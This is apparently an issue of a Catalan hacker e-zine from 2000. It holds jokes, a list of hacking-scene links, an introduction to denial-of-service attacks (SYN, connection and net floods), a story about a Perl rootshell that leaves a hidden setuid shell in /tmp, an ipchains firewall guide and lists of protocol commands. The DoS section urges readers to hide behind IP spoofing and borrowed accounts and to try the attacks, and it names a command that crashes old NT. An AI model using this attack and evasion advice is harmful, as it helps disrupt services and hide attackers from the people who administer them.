Ho sento pero no podia faltar aquest mail en l'apartat d'humor.

JOJOJO

"""""
   Tu recurso:

        http://cathack.itgo.com:80

   que nos fue enviado el 20-Jun-2000 ha sido rechazado
   por una de los siguientes motivos:

        1. Contenido no clasificable en raravista.com
        2. La URL ya esta presente en la base de datos.

   El equipo de Raravista.com
"""""

Si els sistemes operatius fossin linies aeries ...

DOS Air - Els passatgers caminen cap a la pista, agafen l'avio per la part
posterior, l'empenyen fins que l'avio s'enlaira i despres salten a sobre
d'ell. Quan torna al terra, agafen l'avio de nou per la seva part posterior,
l'empenyen fins que agafa alcada, tornen a saltar a sobre d'ell ...

MAC Air - Les caixeres, les hostesses i els pilots es veuen tots iguals, diuen
el mateix i fan el mateix. Quan se'ls fa preguntes sobre el vol, ells responen
que no necessitem saber, no volem saber i que si us plau tornem al nostre
seient i vegem la pel.licula.

Windows Airlines - La terminal es maca i neta, les hostesses amables i els
pilots competents. La flota d'avions que posseeix la companyia es immensa. El
vol comenca sense cap contratemps, el veloc aeropla ens porta sobrepassant els
nuvols fins una alcada de 20.000 peus i llavors ... explota sense la menor
advertencia!

OS/2 Skyways - La terminal esta gairebe buida i nomes un parell de futurs
passatgers deambulen per alli. L'altaveu anuncia que el vol ja ha partit,
encara que no sembla haver cap avio a la pista. Representants de la companyia
es disculpen profusament davant els clients, assenyalant de tant en tant cap
uns nous aeroplans en construccio fora. Informen als passatgers que bo sera el
vol en aquests nous aeroplans i com son de mes segurs que els de Windows
Airlines, pero que hauran d'esperar una mica mentre els tecnics enllesteixen
els sistemes de vol. Tal vegada cap el segon semestre de 1995 o mes tard.

Windows NT - Els passatgers prenen els seients i els porten ells mateixos cap
el asfalt de la pista, on els posen sobre la silueta d'un avio dibuixada en
el terra. Seuen, sacsegen els seus bracos i fan els sorollets de les turbines
de jet, com si estiguessin volant.

Windows 95 Airlines - Es la companyia que substitui a Windows Airlines, cap
alla el 1995. Les millores visibles son:
1) La terminal es encara maca i neta, i amb molts complements.
2) Les hostesses son mes corteses i educades. Podem preguntar-les qualsevol
   cosa i elles respondran, encara que no sempre el que necessitem saber.
3) Els pilots son excel.lents, semblen mes aviat pilots de naus espacials,
   tant que de vegades no sabem molt be cap a on anem.
4) La flota d'avions s'ha incrementat encara mes.
5) Han aconseguit evitar l'explosio erratica de l'aparell als 20.000 peus. Ara
   ja nomes explota si es sobrevola en mig de l'ocea o una serralada de mes de
   5.000 metres. Paracaigudes? No, no porta.

Windows 98 Airlines - Preten substituir a Windows 95 Airlines. En el vol
inaugural va estavellar-se amb el seu propietari a dins. Despres d'una serie
de demandes per obligar als passatgers a prendre cafe marca MocoSoft IE sense
possibilitat de prendre Nescafe Navigator, van decidir reparar els avions i
provar de nou.

Unix Express - Els passatgers porten amb ells una peca de l'aeropla i una
caixa d'eines cap a l'aeroport. Es reuneixen a l'asfalt de la pista, discutint
sobre quin tipus d'avio desitgen construir. Es divideixen en grups i cadascun
d'ells construeix un avio diferent, encara que al final tots li posen el
mateix nom. Nomes alguns passatgers arriben a la seva destinacio, pero tots
creuen que ho han fet.



                                                  De pell endins mano jo

  ____ _____   ____ _____   ____ _____   ____ _____   ____ _____   ____ 
 /    /\    \_/    /\    \_/    /\    \_/    /\    \_/    /\    \_/    /\
/_ _ /  \ _ _\ _ _/  \ _ _\ _ _/  \ _ _\ _ _/  \ _ _\ _ _/  \ _ _\ _ _/  \
\    \__/    /    \__/    /    \__/    /    \__/    /    \__/    /    \__/
 \____\/____/ \____\/____/ \____\/____/ \____\/____/ \____\/____/ \____\/



$08$

   _       _  ___   ____ ___  _  _____
  / \     / \/   \ |    /   |/ // ____\
 /  /___  / \     \|   /      < \____  \
/       \/   \        /|    .  \/       \
\________\____\/\____/ |____|\__\_______/  (enllaços pels amics :)


Aqui us oferim alguns links interessants que si visiteu de segur que
trobareu informació util, us recordem que podeu contactar amb nosaltres
per enviar els vostres links preferits a: poptph@hotmail.com



ReDosDeDos:
   > www.redosdedos.8m.com
   > www.geocities.com/redosdedos

   Us redactem la seva presentació, aixi us queda més clar:

   Salut i força en la lluita, company/a!

   Redosdedos som un col·lectiu internacionalista marxista-leninista
   de la xarxa. L'objectiu d'aquesta iniciativa socialista és, sens
   dubte, fer front al feixisme, el capitalisme, el sexisme i el
   racisme que abunda a internet. No es tracta d'una organització de
   hackers ni professionals en informàtica, només cal ser antifeixista,
   tenir ganes de lluitar i poder accedir a internet. El col·lectiu
   disposa d'una llista de correu on podem contactar entre nosaltres;
   aviat hi haurà també un canal d'irc (#redos) al servidor hispano.
   Des de #redos es podra crear llavors el tan esperat REDos IRC SQUAD
   per a lluitar contra el feixisme d'aquest servidor.
   Redosdedos creiem en la informàtica com una èina més de lluita
   contra el sistema i per la llibertat de tots els pobles, com Marx
   va dir: «cal aplicar el progrés a la lluita». Per aconseguir aquests
   objectius ens cal aglutinar el màxim de gent i associacions possibles;
   si et vols unir a nosaltres o simplement, rebre més informació sobre
   Redosdedos, contacta amb nosaltres mitjançant la nostra adreça 
   electrònica o bé deixa'ns un missatge al llibre de visites de la
   pàgina.

   redos@olemail.com <------- Adreça electrònica del col·lectiu
   redosdedos@egroups.com <-- Adreça electrònica de la nostra llista
         de correu (si escrius a aquesta adreça tots/es els/les que
         estan apuntats/des a la llista podran llegir el teu missatge)

   Qualsevol proposta que envieu és ben rebuda a la nostra bústia i tindrà
   resposta immediata.




www.eEye.com:
      Pàgina del conegudíssim escanejador de serveis per NT Retina




Hax0r News:
      Un dels grups de notícies que més treballen dins del mundillu del
      hacking, es recomenable mirar-se les ezines en txt, ja que molts
      programes només vénen ben escrits en la versió txt, en canvi en la
      html els modifiquen pq no funcionin.
      > http://www.csoft.net/~hwa


www.barrapunto.com:
      Portal alternatiu on trobareu bastanta info sobre novetats en
      Linux i altres temes relacionats amb la informàtica (no gaire de
      hack...pq es delinquir xD :(



www.shagroup.cjb.net
      S.H.A. - Sociedad Hacker Anònima - un grupet de 2 paios que es
      dediquen a compartir informació de temàtica hpcv, trobareu bastants
      articles pels qui vulguin iniciar-se en temes d'aquests.
        - Salut HeLLBoY!



http://www.hackers.com/
      Cal explicar de que va aquesta pàgina?



http://linux.box.sk/
      Organitzat per temàtiques podreu trobar bastanta info sobre linux.



ftp.technotronic.com
      Potser un dels millors FTPs, aqui podreu trobar tota mena de
      programes, textes, etc, relacionats amb el món del hacking.


www.islatortuga.com
      Torna a ser oberta la seva pàgina, encara no completament operativa
      però dona bastant de sí. Salutacions a l'Angeloso!


www.sindominio.net
      Servidor alternatiu creat per diversos CSO (Centres Socials Okupats)
      on podreu trobar informació de diversos colectius i moviments, 
      entre ells Ràdio Bronka i la organització del HackMeeting 2000 que
      es prepara per l'octubre.



                                    PD: 2/9/2k; Pos eso la data :P - LoBo


\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
//////////////////////////////////////////////////////////////////////////

$09$



==========================================
INTRODUCCIÓ ALS Denials Of Service (DoS)
2a PART
==========================================

Per fi ens tornem a trobar!!! Com han anat les vacançes? B oi? Ja heu
practicat o heu buscat info per la vostra banda?!?! Espero que si.
Cada dia, els DoS estan mes de moda. Bugs del windows com el c:\con\con
o c:\lpt\lpt cada cop hi ha mes gent ke els intenta explotar, no ho heu
notat al IRC? Aix ke en farem d'akets...

Vinga, expliquem mes atacs de tipus DoS com haviem kedat en l'anterior
text.


2. Syn Flood:

El protocol TCP d'Internet, sobre el que es basen la majoria dels serveis
(e-mail, web, IRC, ...) implica una conexió entre dues maquines.
L'establiment d'aquesta conexió es realitza mitjançant el que se'n diu
"conexió en tres pasos", precisament pq requereix la realització de tres
pasos inicials abans que la conexió es pugui considerar establerta. Si el
pas final no s'arriba a establir, la conexió romàn en un estat "semiobert". 

El problema es que molts SO tenen un límit molt baix en el nombre de
conexions "semiobertes" que poden manejar en un moment determinat. Si es
supera el límit, el servidor sensillament deixa de respondre a les noves
peticions de conexió que li arribin. Les conexions "semiobertes" caduquen
al cap d'un temps, alliberant espais per a noves conexions, pero mentres
hi hagi un atacant que mantingui el "syn flood" hi ha moltes probabilitats
de que una conexió alliberada recentment sigui capturada per un nou "Syn".

El que li passa a aket atak eske es molt vell i nomes enviant paquets Syn
cada 4 segons a un sistema operatiu que hagi fixat el limit d'ordre de 5 a
30 conexions "semiobertes" que caduquen al cap de 2 o 3 minuts, aconseguim
el Denial Of Service. :D

Clar, tot atac com sempre s'ha de realitzar des d'una conta condó que
protegeixi la nostra identitat, sempre va be fer una mica d'ip-spoofing a
alguna makina per ferli veure al nostre objektiu ke els pakets
ke rep, venen d'una makina ke no es la nostra. ^_^

Com es poden protegir els admins d'aquests atacs? Be.. eske aket atak ia
es vellet i molts sistemes operatius estan inmunitzats contra aket tipus
d'atak, sigui pq hi hagi la ultima versió del SO o pq s'hagi aplicat el
patch corresponent.


2.1 Connection Flood:

Com indica el seu nom, es tracta de colapsar la conexio. Sona lleig pero
es tracta d'aixo. XD

Totes les conexions tenen un limit maxim d'usuaris simultanis enxufats.
Un cop s'arriba a aquest limit no ens hi podem conectar. imaginemnos un
server irc. Posem ke per exemple el servidor irc.XXX.es nomes accepta 100
conexions simultanies, el ke em de fer es fer 100 conexions cap a ella i
no fer cap peticio sobre elles, de tal manera que monopolitzarà el server.
Al ser un server irc, les connexions niran caducant ja que ens fan un ping
constantment pero el que em de fer es reemplaçarles constantment com en el
Syn Flood.

Aquests atacs de DoS simplement amb un Firewall o amb una actualitzacio
del Sistema Operatiu se soluciona.


2.2 Net Flood

Aket es dels mes fotuts ja ke la viktima no hi pot fer res. Enkara ke
filtri les conexions malicioses, les seves linies estaran saturades.
Exemple: El telefun, si vols putejar a un pavo pos el vas trukant tot el
rato fins ke sen kansa i el deixa despenjat pq no el rallis mes, llavors
ell tb esta putejat pq no rep trukades d'altres persones :\

El net flood ve a ser alguna cosa semblant, per molt ke filtrem l'atac al
nostre firewall, ens trobem que les linies estan saturades. El que fan els
admins quan es troben en aquests casos és:

-Filtrar els atacs en l'extrem de linia del operador de "backbone" de
  manera que intenti esbrinar d'on ve.

-Despres intenten localitzar l'atac i informar als admins, ja que aket
  atak pot desembocar en un hack.

El ke hem de fer es un Ip-spoofing com a manera de seguretat, i si
realitzem un atac de net flood, no ferlo gaire estona mes de 2 hores,
sino ens podrien localitzar en un plis plas i cagada pastoret.


Be fins aqui una petita llista d'atacs que es poden fer des de l'exterior,
des de l'interior tb sen poden fer i son tan efectius com els exteriors.
Ja en vaic anomenar uns quants a la primera part del texte de la revista
CatHack! #4. Va... us dic el de petar un NT vell.. Nomes has de posar:
"Dir ..\" i es penjen les NT versions 3.5 i 3.51.



3. Que fariem per intentar "contrarestarnos"?

El primer de tot seria parxejar el nostre sistema operatiu i cancelar els
serveis ke poden ser explotats o que no interessa ke els tokin: fingerd
systat netstat, pop3, daytime, time, echo... Aquests ultims es podrien
combinar per fer un buckle i causar el DoS.

Tambe estaria bé tenir taskes monitoritzades, i un firewall ens seria de
gran ajuda (i encara ens serviria de mes si ens el configuresim manualment
de manera ke sapiguem ke tenim segur...).

Els loggers convindria emprarlos en serveis tipus el telnet, rlogin... etc.

Ja ke tenim logs, almenys revisemlos de tant en tant no? A veure ki
intentava fer coses dolentes...

I fins aki la lliço teorika de DoS, ara vosaltres us toka fer la practica.
No es tant dificil penjar makines, no? xD

PGB Vacances 2k


\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
//////////////////////////////////////////////////////////////////////////



$0A$
                                          ______
                                         /      \_____            ____/
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% _____       \__________/   ___
%%  Història d'una cloïssa d'arrels... %%/     \__              ____/
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%      _  \____________/     ___
                                         \____/ \________       ____/
                                                         \_____/
per Pop.tPH ... the biggest oktopus

---

HE CONSEGUIT HACKEJAR LA MEVA MÀQUINA!!!!!

HE HACKEJAT UNA RH6.2.


Explico:

Després de conèixer a un admin q em va guiar en tot això em va picar i
em va retar a que trobés una RootShell (Cloïssa d'arrels), un element
escàs degut al seu gran poder, ja que només d'executar-lo et dona
privilegis d'arrel (Root).

Vaig començar la meva búsqueda per la xarxa, durant 3 mesos pasejant
per pàgines, servidors, irc, i res, ningu en sabia res, era una
llegenda potser? una mentida...no pot ser, estic segur k existeix i
que l'he de trobar...jo solet...ja k (k jo sàpiga ningu s'ha esforçat
a seguir el meu camí (potser s'han interessat amb el preuat oferiment
celestial) però no han patit tant com jo per aconseguir-ho.

Doncs bé, el cas es k buscant i buscant, vaig trobar-ne una en una
publicació de noticies sobre hacking, on amablement te'n oferien una
barnissada amb Perl. No vaig dubtar-ho...després de observar-la
meravellat, havia de comprobar si veritablement eren certs aquells
poders que el gran admin em va comentar, potser era un fake, un codi
modificat pq no oferís el veritable funcionament...

Vaig còrre al Linux (bastant petadet ja pobret...de tantes probes
que faig en ell el seu aspecte estava força degradat...era un aspecte
gris i antic de consola, els colors s'havien perdut en un accident de
TCP suposo, i molts dimonis havien mort (telnetd). Pero el primer que
vaig fer va ser copiar-me el codi a la meva cova situada en /home/cathack
allà podia fer el que volgués, ja que el gran Germà era jo i per tant no
corria perill, era un lloc abandonat, aïllat de la gran xarxa.

Vaig executar l'script Perl i semblava que no donava cap resposta...
estava mal fet? no crec, hauria donat error...extrany...vaig observar-lo
de més aprop, i vaig veure que el que havia executat a part de ser una
cloïssa d'arrels tb tenia protecció, era un protector de la cloïssa
sagrada, una aureola negre de buidor sense resposta, de bucle infinit,
es quedava resident en l'ambient i matava els usuaris que intentessin
controlar-li, borrava les marques que deixava i demés...

Estava flipant, pero no m'ho acabava de creure encara, la cloïssa encara
no havia demostrat que pogués donar-me poders...aquella arrel va crear
una còpia modificada de la cloïssa del sistema en el directori temporal
sota un nom ocult, vaig saltar de la meva cova per anar a l'altre, una
més en fora anomenada /tmp i allà vaig trobar-ho, en la cova on acostuma
a ser utilitzada com a contenidor, on van totes les restes, on res té
cap valor, estava, ben amagada, amb un puntet davant el seu nom, una
preciada cloïssa de tamany considerable (309KB) era una còpia del
/bin/sh modificada, la seva aparença brillava sota una lluentor de color
verda, com llueixen els demés executables, pero era extrany, algo em
deia que era especial...

Vaig revissar els meus privilegis ...id... si, tenia permissos d'usuari
UID=500 GID=500, per sort podia accedir a aquella cova on s'acumula de
brosa...vaig respirar fons i vaig tocar-la perquè funcionés...una
extranya sensació em va recòrre, estava igual que abans, no havia hagut
cap error, estava viu, i la cloïssa gegant davant meu... havia de revisar
de nou els meus privilegis ...id... UN CRIT EM VA SORTIR DE DINS: SóC
ROOOOOOT!! , l'adrenalina em va pujar i es que no era per menys, els
documents oficials del sistema no enganyen: UID=500 GID=500, pero hi
havia la lletra petita... EUID=0 (root), havia de probar-ho...

vaig sortir correns d'on era (la cova /tmp) i vaig anar a aquella cova
on sempre havia tingut l'accés restringit, el preciós i important castell
de /root, els guardians m'impedien que hi accedís fins a aquell moment
on em van deixar passar sense ni mirar-me...em sentia important, m'havia
colat on no era, a privilegis superiors, ara podia controlar el sistema JO.

Vaig pujar el volum del CD (Platero y tú) i vaig cridar d'alegria...sort
que estava sol...pq sino em podrien haver prés per boig o tarat mental.

----

la història no acaba aquí ja que això és el principi d'una llarga història
d'aventures al costat dels poders mellaverossos d'aquesta precisada cloïssa.

----

espero k us hagi agradat la història , he intentat donar-li una mica de
llegenda medieval a la cosa...com sempre m'ha agradat veure el hacking...
i bé...no em prengueu per possesiu, sino per previssor, aquesta cloïssa
és molt poderosa, i pot ser utilitzada pel bé o pel mal , aixi que no
la passaré ... excepte a la gent que vagi a les kdds (la veritable gent
que s'interessa pels temes i que tinc confiança en ella pq faci bon us
dels seus poders).

espero k aixo us animi a aprendre. i k us animi a vindre a les kdds ;)



HACK STARTS NOW!
  |
   `-->   (ºoº) - POP!



                                Les llibertats no es donen, es prenen.
                                                  -Àsef Eid


&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
  ---Si el  món fós dominat  pels hackers, no hi  haurien guerres, ni fam...
  potser  molts  accidents  -  Segons va  dir  un  anònim de  hax0r  news---
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

$0B$


Firewall per linux: IPCHAINS by KL4RK
----------------------------

[[[  INTRO  ]]]

Primer que res, recordem què és un firewall. La idea és simple... Al nostre
ordinador hi van arribant paquets tota l'estona, alguns dels quals no ens
agradaria pas rebre'ls, per exemple nukes, o connexions a netbios, port 23 o
6000.

Potser ens interessa restringir quines ips poden accedir a un port determinat,
o des de quin dispositiu de xarxa poden usar o no uns determinats serveis.

Tot això, s'implementa amb l'ajut d'un firewall. És un software que maneja
els paquets que arriben a través de les targes de xarxa, el modem, o el que
sigui. I és capaç de diferenciar-los, segons el port de procedència/destí,
el protocol, de quina interfície prové, etcètera.

Existeixen un munt de programes per tots els sistemes operatius amb aquesta
funció. Per windows n'hi molts, i per unix, obivament, també. Alguns son
molt cars d'obtenir, però un dels millors, a més tenint en compte la rela-
ció qualitat preu, segur que és ipchains: gratuït, potent i estable.

Ve inclòs en moltes distribucions de linux (potser totes?).

Tot el que s'explica en aquest text hauria de funcionar sota un sistema
linux, exceptuant algunes parts, específiques per RedHat linux.

[[[ Usant IPCHAINS  ]]]

Donem els primers passos. Primer que res, hem de conèixer el funcionament de
ipchains. Primer, crea conjunts de normes les quals aplica als paquets
entrants/sortints. Cada conjunt d'aquests és una cadena (chain).

Per defecte, hi ha tres cadenes: input, forward i output. La primera s'aplica
als paquets que entren a la màquina, forward als que entren demanant ser re-
enviats, i output als paquets sortints.

Quan arriba un paquet, el firewall agafa la cadena input, i mira si la primera
ordre de la cadena li és aplicable. Exemple:

cadena input (default policy ACCEPT):
-------------------------------------
-Si el paquet va dirigit al port 23:   accepta'l
-Si el paquet va dirigit al port 25:   refusa'l
-Si el paquet va dirigit al port 6000: refusa'l

I arriba un paquet provinent de 190.1.2.3:1025 cap a localhost:25

Ipchains mirarà de aplicar-li la primera norma. Com que el paquet no va
cap a localhost:23, no li aplica la primera norma, passa a la següent.
Com que el paquet va dirigit a localhost:25, la segona norma si que li
és aplicable, per tant, refusa el paquet, i llestos.

I què passaria si cap norma s'aplica al paquet entrant? Doncs s'aplica
"default policy". En aquest cas, default policy = accept, per tant,
acceptaria per defecte qualsevol paquet que no anés dirigit als ports 23,
25 o 6000. Si la default policy fos deny, no deixaria passar el paquet.

Als paquets entrants se'ls aplica la cadena INPUT, als sortints la output, i
aquells paquets que demanin una redirecció a alguna altra màquina, forward.


Anem a veure un primer exemple pràctic. Quan creem un firewall, el primer
que hem de fer és pensar el que necessitem. A partir d'aquí ja implementa-
rem el firewall com nosaltres volguem, o poguem; el primer, és tenir les
idees una mica clares.

Volem
 * evitar que arribin paquets
    -TCP al port 139  des de la interfície ppp0
    -TCP al port 23   des de la interfície eth0
    -TCP al port 6000 des de qualsevol interfície
    -TCP a qualsevol port provinents del port remot 444
              i la interficie ppp0.
    -ICMP
    -des de 120.120.120.120  (qualsevol paquet)
    (acceptar qualsevol altre paquet entrant)
 * evitar que surtin paquets
    -ICMP cap a la interficie eth0
    (acceptar qualsevol altre paquet sortint)
 * evitar qualsevol tipus de forwarding

Un cop tenim els objectius ben clars... mans a la obra.

Primer que res, definim les "default policies" per cada chain. Per input i
output, accept, i per forward, reject: [obviament cal ser root]

# ipchains -P input ACCEPT
# ipchains -P forward DENY
# ipchains -P input ACCEPT

            (borrem les normes [rules] de totes les cadenes)
# ipchains -F

            (borrem totes les chains que no siguin les
         per defecte presents, és a dir, input, output i forward)
# ipchains -X

Ara ja hem borrat qualsevol norma o chain existent, i falta afegir
les rules corresponents a cada chain. Un com aquí, ens disposem a
introduir les normes que en interessin a cada chain.

Per introduir una norma, es fa així:
# ipchains -A chain -p proto -s font -d desti (......) -j FEINA
  \______/ \-----------------------------------------/ \------/
     |       |_ característiques que ha de tenir el     |
     |          paquet                                  |_ feina sobre
     |_ executem ipchains                              el paquet (acceptar,
                                                       ignorar, destruir...)

Comencem a crear el nostre firewall, doncs.

# ipchains -A input -p tcp  -s 0.0.0.0/0 -d 0.0.0.0/0 139 -i ppp0 -j REJECT
# ipchains -A input -p tcp  -s 0.0.0.0/0 -d 0.0.0.0/0 23  -i eth0 -j REJECT
# ipchains -A input -p tcp  -s 0.0.0.0/0 -d 0.0.0.0/0 6000        -j REJECT
# ipchains -A input -p tcp  -s 0.0.0.0/0 444 -d 0.0.0.0/0 -i ppp0 -j REJECT
# ipchains -A input -p icmp -s 0.0.0.0/0 -d 0.0.0.0/0             -j REJECT
# ipchains -A input   -s 124.124.124.124 -d 0.0.0.0/0             -j REJECT

Com ja heu pogut endevinar:
  -A chain: chain on s'ha d'afegir la norma.
  -p proto: proto és el protocol del paquet (tcp, udp, icmp.....)
  -s ip(s) (port[s]): les ips source (font). Si no s'especifica port,
                      qualsevol. 
              0.0.0.0/0: qualsevol IP  
              1.0.0.0/8: la xarxa 1.x.x.x
              1.2.0.0/16: la xarxa 1.2.x.x
              1.2.3.0/24: la xarxa 1.2.3.x
              1.2.3.4/32: la IP 1.2.3.4

  -d ip(s) (port[s]): el mateix però ips de destí, és a dir, normal-
                      ment la nostra màquina.
  -i interfície: la interfícide de la qual ha de venir el paquet.
  -j [feina]: si el paquet compleix les condicions esmentades, la feina que
              ha de fer ipchains. Hi ha diverses possibilitats:
                    ACCEPT -> accepta el paquet
                    REJECT -> refusa el paquet
                    DENY   -> destrueix el paquet
                    RETURN -> retorna el paquet
                    REDIRECT -> redirigeix el paquet cap a un altre port.
                    NONE   -> Com si ipchains no hi fos.

Amb aquests coneixements, ja podem acabar el nostre firewall en un moment:

# ipchains -A output -p icmp -s 0.0.0.0/0 -d 0.0.0.0/0 -i eth0 -j REJECT



[[[  Shell Script  ]]]

Ja està. Ara tenim un firewall instal.lat. Molt bonic, però quan reiniciarem
l'ordinador, el firewall ja no hi serà, i ens haurem de matar a tornar a
escriure totes les normes. Millor que fem un script executable que ens
estalvii la feina!:

---------------------------------------------(firewall.sh)
#!/bin/sh
# Petita firewall.
# Modifiqueu les variables per tal que s'ajustin
# al vostre sistema... 
# No em faig responsable de qualsevol conseqüència
# (bona o dolenta) de l'ús d'aquest script :)

ipchains=/sbin/ipchains          
Any="0.0.0.0/0"

$ipchains -P input ACCEPT
$ipchains -P forward DENY
$ipchains -P output ACCEPT

$ipchains -F
$ipchains -X


$ipchains -A input -p tcp  -s $Any     -d $Any 139 -i ppp0 -j REJECT
$ipchains -A input -p tcp  -s $Any     -d $Any 23  -i eth0 -j REJECT
$ipchains -A input -p tcp  -s $Any     -d $Any 6000        -j REJECT
$ipchains -A input -p tcp  -s $Any 444 -d $Any     -i ppp0 -j REJECT
$ipchains -A input -p icmp -s $Any     -d $Any             -j REJECT
$ipchains -A input -s 124.124.124.124  -d $Any             -j REJECT

$ipchains -A output -p icmp -s $Any -d $Any -i eth0 -j REJECT

----------------------------------------(final de firewall.sh)

Ara ja tenim un script que ens configura el firewall amb la seva execució.
EEl podem posar en algun lloc accessible, amb els permisos adequats, per
exemple, /etc/firewall.start.sh:

# mv firewall.sh /etc/firewall.start.sh
# cd /etc/firewall.start.sh
# chmod 700 firewall.start.sh

Amb el qual podrem iniciar el firewall teclejant '/etc/firewall.start.sh'.


[[[  Auto-inici del firewall  ]]]  (NOMÉS REDHAT!)

Això ja és específic de RedHat, i funciona segur sota 6.2 (i segurament en
moltes versions anteriors i potser en posteriors).

Ara cal que cada cop que s'inicii l'ordinador el firewall entri en acció. Això
no és gaire difícil. Tot seguit la explicacio:

Creem l'arxiu /etc/rc.d/init.d/firewall següent:

#!/bin/sh
# Startup script for the firewall
#
# chkconfig: 2345 05 92
# description: Starts and stops the IPCHAINS Firewall \
#              used to provide Firewall network services.

 /etc/rc.d/init.d/functions
 /etc/sysconfig/network

if [ ${NETWORKING} = "no" ]
then
        exit 0
fi

[ -f /sbin/ipchains ] || exit 0

case "$1" in
  start)
        echo -n "Starting Firewall:"
        echo 1 > /proc/sys/net/ipv4/ip_forward
        /etc/firewall.start.sh
     ;;
  stop)
        echo -n "Shutting down Firewall:"
        ipchains -F
        ipchains -X
        ipchains -P input  ACCEPT
        ipchains -P output ACCEPT
        ipchains -P forward ACCEPT

     ;;
  status)
        status firewall
     ;;
  restart|reload)
     $0 stop
     $0 start
     ;;
  *)
     echo "Usage: firewall {start|stop|status|restart|reload}"
     exit 1
esac

exit 0
--------------------------------(fi de /etc/rc.d/init.d/firewall)

Gairebé ja ham acabat:

# chmod 700 /etc/rc.d/init.d/firewall 
# chown 0.0 /etc/rc.d/init.d/firewall 
# chkconfig --add firewall 
# chkconfig --level 345 firewall on 

Ara podeu provar que tot funciona correctament:

# /etc/rc.d/init.d/firewall start
Starting Firewall:
# /etc/rc.d/init.d/firewall stop
Shutting down Firewall:
#

I ja està. Ara cada cop que s'engegui l'ordinador ja tindreu el firewall
activat i configurat!

[[[  Ampliar coneixements  ]]]

Primer que res, cal que sapigueu que el firewall creat anteriorment
és força baix a nivell de seguretat. Busqueu el Firewall Howto, que
és un document enfocat a com crear un firewall segur; si voleu partir
d'un bon començament per fer un firewall a la vostra mida, mireu-vos el
del Sucuring-Optimizing Red Hat Linux, un bon punt de partida.

I pel que fa a altres opcions del ipchains, feu 'man ipchains'.

Per altra banda, aquells que volgueu diposar d'un firewall facil de
configurar i amb una interfície gràfica a l'estil de la ConSeal PC
Firewall de win, doncs us recomano gfcc, un front-end del ipchains.
És a dir, un programa que permet usar ipchains de manera més fàcil
i visual.

[[[  Concusió ]]]

Com hem vist, implementar un firewall en linux és fàcil, i barat.
Òbviament, aquest firewall es poca cosa, bàsicament restringeix la
connexió a alguns ports, i el tipus de nuke més frequentat pels
descerebrats a l'irc. Però aquest mateix programa es pot fer servir
per crear un firewall digne d'un bon administrador de sistema.


[[[  Bibliografia  ]]]

Per l'elaboració d'aquest escrit, he usat:
- manual del ipchains (man ipchains)
- Securing-Optimizing-RH-Linux-1_2.pdf (excel.lent manual!)
- Els arxius creats pel gfcc (gfcc-0.7.4-1)

No cal dir que aquest text pretén ser una mera introducció, i que
el firewall usat com a exemple és feble i poc recomanable de cara
a un ús en ordinadors compromesos. A més, segurament no s'adaptarà
a les necessitats de gaires usuaris... Apreneu a fer un firewall
segur llegint el firewall-howto.


==============================================================================
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
==============================================================================
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
==============================================================================
$0C$


==============================================================================
                        II   SMTP, POP, FTP,Finger II
                        II    ·. per BaRner .·     II
                        II=========================II




He fet aquest text perquè sempre és útil i necessari aprendre quins 
comandaments utiltiza el nostre programa de mail , d'ftp, etc..
O també per quan algun dia entreu a algun d'aquest protocols i ho 
hagueu de fer manualment!!

I aqui us deixo amb els comandaments mes importants dels principals protocols


====================================================================
			SMTP Protocol
			^^^^^^^^^^^^^^
port: 25

Els principals comandaments son:


HELO <qualsevol_host>      Aquest especifica la direcció de la maquina
	                   des de on s'envia el mail
MAIL FROM:<sender@address.dom>  Especifica la direcció de correu del 
				 remitent
RCPT TO:<receiver@address.dom>   Especifica la direcció de correu del destinatari
DATA   Amb aquest començarem a escriure el missatge
RSET   Especifia que la transferencia de l'email serà borrada 
NOOP   Aquest comandament unicament serveix perque el servidor et respongui amb un OK
QUIT   Per sortir


exemple: 

telnet host 25

helo host  (on host és qualsevol host)
mail from:<remitent@host.com>   (tambe es pot fer sense < > )
rcpt to:<destinatari@host.com>
data
Això es un exemple de com enviar un mail
.     (amb el punt volem dir que ja hem acabat)

(i el mail s'enviarà)



===================================================================
	            Post Office Protocol  (POP)
	            ^^^^^^^^^^^^^^^^^^^^^^^^^^

port: 110
		
Els principals comandaments son:

   
           USER usuari      Utilitzats en l'autentificació   
           PASS password    Utilitzats en l'autentificació
           QUIT		    Per sortir
           LIST [msg]       Per llistar els missatges que tens
           RETR msg         Per llegir missartges
           DELE msg         Per borrar missatges
           NOOP             El server et respon amb un OK
           LAST             Per llegir l'ultim missatge rebut

Per a mes informació mireu-vos la rfc 1225 que la podeu baixar de:
http://www.cis.ohio-state.edu/htbin/rfc/rfc1225.html


=================================================================

	          File Tranfert Protocol  (FTP)
	          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

port: 21

Principals comandaments:
  
    ?            -Em mostrarà una llista de comandaments
